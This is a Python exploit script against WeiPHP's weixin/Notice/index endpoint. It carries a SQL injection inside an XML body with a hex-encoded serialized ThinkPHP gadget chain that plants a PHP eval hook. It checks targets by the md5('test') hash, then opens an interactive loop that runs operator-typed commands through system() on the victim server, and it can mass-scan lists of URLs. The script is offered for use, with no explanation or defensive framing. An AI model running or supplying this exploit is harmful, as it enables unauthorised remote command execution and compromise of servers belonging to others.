import requests
import urllib3
import re
from urllib.parse import urljoin,quote
import argparse
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def read_file(file_path):
    with open(file_path, 'r') as file:
        urls = file.read().splitlines()
    return urls

def generate_random_string(length):
    characters = string.ascii_letters + string.digits
    random_string = ''.join(random.choice(characters) for _ in range(length))
    return random_string

def check(url):
    url = url.rstrip("/")
    target_url = urljoin(url, "/public/index.php/weixin/Notice/index?img=echo+md5(test);exit();")
    headers = {
        "User-Agent": "Mozilla/2.0 (compatible; MSIE 3.01; Windows 95",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    data = """<xml><product_id>aaaa</product_id><appid>exp</appid><appid>=0) union select 1,2,3,4,5,6,7,0x4f3a32373a227468696e6b5c70726f636573735c70697065735c57696e646f7773223a313a7b733a33343a22007468696e6b5c70726f636573735c70697065735c57696e646f77730066696c6573223b613a313a7b693a303b4f3a31373a227468696e6b5c6d6f64656c5c5069766f74223a323a7b733a393a22002a00617070656e64223b613a313a7b733a333a226c696e223b613a313a7b693a303b733a323a223131223b7d7d733a31373a22007468696e6b5c4d6f64656c0064617461223b613a313a7b733a333a226c696e223b4f3a31333a227468696e6b5c52657175657374223a353a7b733a373a22002a00686f6f6b223b613a323a7b733a373a2276697369626c65223b613a323a7b693a303b723a383b693a313b733a353a226973436769223b7d733a363a22617070656e64223b613a323a7b693a303b723a383b693a313b733a363a226973416a6178223b7d7d733a393a22002a0066696c746572223b613a313a7b693a303b613a323a7b693a303b4f3a32313a227468696e6b5c766965775c6472697665725c506870223a303a7b7d693a313b733a373a22646973706c6179223b7d7d733a393a22002a00736572766572223b733a313a2231223b733a393a22002a00636f6e666967223b613a313a7b733a383a227661725f616a6178223b733a333a22696d67223b7d733a363a22002a00676574223b613a313a7b733a333a22696d67223b733a33303a223c3f70687020406576616c28245f524551554553545b27696d67275d293b223b7d7d7d7d7d7d,9,10,11,12-- </appid><mch_id>aaa</mch_id><nonce_str>aaa</nonce_str><openid>aaa</openid></xml>"""
    try:
        response = requests.post(target_url, verify=False, headers=headers, data=data, timeout=15)
        if response.status_code == 500 and '098f6bcd4621d373cade4e832627b4f6' in response.text:
                print(f"\033[31mDiscovered:{url}: Weiphp_RCE!\033[0m")
                return True
    except Exception as e:
        pass

def run(url):
    url = url.rstrip("/")
    headers = {
        "User-Agent": "Mozilla/2.0 (compatible; MSIE 3.01; Windows 95",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    if check(url):
        while True:
            command = input("\033[34mPlease input command (stop input:exit):\033[0m")
            if "exit" not in command:
                command = quote(command)
                target_url = urljoin(url, "/public/index.php/weixin/Notice/index?img=system({});exit();".format(command))
                data = """<xml><product_id>aaaa</product_id><appid>exp</appid><appid>=0) union select 1,2,3,4,5,6,7,0x4f3a32373a227468696e6b5c70726f636573735c70697065735c57696e646f7773223a313a7b733a33343a22007468696e6b5c70726f636573735c70697065735c57696e646f77730066696c6573223b613a313a7b693a303b4f3a31373a227468696e6b5c6d6f64656c5c5069766f74223a323a7b733a393a22002a00617070656e64223b613a313a7b733a333a226c696e223b613a313a7b693a303b733a323a223131223b7d7d733a31373a22007468696e6b5c4d6f64656c0064617461223b613a313a7b733a333a226c696e223b4f3a31333a227468696e6b5c52657175657374223a353a7b733a373a22002a00686f6f6b223b613a323a7b733a373a2276697369626c65223b613a323a7b693a303b723a383b693a313b733a353a226973436769223b7d733a363a22617070656e64223b613a323a7b693a303b723a383b693a313b733a363a226973416a6178223b7d7d733a393a22002a0066696c746572223b613a313a7b693a303b613a323a7b693a303b4f3a32313a227468696e6b5c766965775c6472697665725c506870223a303a7b7d693a313b733a373a22646973706c6179223b7d7d733a393a22002a00736572766572223b733a313a2231223b733a393a22002a00636f6e666967223b613a313a7b733a383a227661725f616a6178223b733a333a22696d67223b7d733a363a22002a00676574223b613a313a7b733a333a22696d67223b733a33303a223c3f70687020406576616c28245f524551554553545b27696d67275d293b223b7d7d7d7d7d7d,9,10,11,12-- </appid><mch_id>aaa</mch_id><nonce_str>aaa</nonce_str><openid>aaa</openid></xml>"""
                try:
                    response = requests.post(target_url, verify=False, headers=headers, data=data, timeout=15)
                    if response.status_code == 500 and 'array_merge()' in response.text:
                        pattern = r"</html>(.*)"
                        match = re.search(pattern, response.text, re.DOTALL)
                        if match:
                            content = match.group(1)
                            print(content.strip())
                except Exception as e:
                    pass
            else:
                break

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url", help="URL")
    parser.add_argument("-f", "--txt", help="file")
    args = parser.parse_args()
    url = args.url
    txt = args.txt
    if url:
        run(url)
    elif txt:
        urls = read_file(txt)
        for url in urls:
            check(url)
    else:
        print("help")